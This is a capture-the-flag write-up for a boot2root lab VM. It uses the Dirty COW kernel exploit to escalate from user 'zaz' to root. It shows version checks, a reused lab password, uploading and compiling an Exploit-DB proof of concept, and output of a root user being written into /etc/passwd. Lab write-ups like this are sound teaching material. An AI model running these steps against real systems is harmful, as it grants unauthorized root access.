# Writeup 2 - Kernel Vulnerability

After reading some documentations on how to achieve privilege escalation, we got the idea to search for kernel vulnerabilities.

As mentioned there, https://payatu.com/guide-linux-privilege-escalation, the **Dirty Cow** exploit affects the linux kernel versions **before and including the 3.19.0-73.8 release**.

So we check our kernel version:

```bash
zaz@BornToSecHackMe:~$ uname -r
3.2.0-91-generic-pae
```

And we see it is running on a vulnerable version. Here is a github repository with a lot of different proof of concepts that use the dirty cow exploits:  
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs

We tried to use one of them, but after looking at the comments, we realise the success of the poc also depends on the version of the OS, so we check the VM version to try to find one that could work for us:

```bash
zaz@BornToSecHackMe:~$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 12.04.5 LTS
Release:	12.04
Codename:	precise
```

And after some research on google we find this one (see the scripts section):  
https://www.exploit-db.com/exploits/40839  

So we download it and sent it to the VM through scp on the zaz account, using the credentials found during the 1st writeup:  
**zaz:646da671ca01bb5d84dbb5fb2238dc8e**

The scp command on our machine:

```
boot2root: ✗ scp -P 22 exploit_dirtycow.c zaz@192.168.1.76:~/
```

Then we log in on the VM with zaz account through ssh, and compile the exploit with gcc, and execute it:

```
zaz@BornToSecHackMe:~$ gcc -pthread exploit_dirtycow.c -o dirty -lcrypt
zaz@BornToSecHackMe:~$ ./dirty 
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 
Complete line:
firefart:fi6bS9A.C7BDQ:0:0:pwned:/root:/bin/bash

mmap: b7fda000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'test'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'test'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
zaz@BornToSecHackMe:~$ su firefart
Password: 
firefart@BornToSecHackMe:/home/zaz# id
uid=0(firefart) gid=0(root) groups=0(root)
```

And we are root!
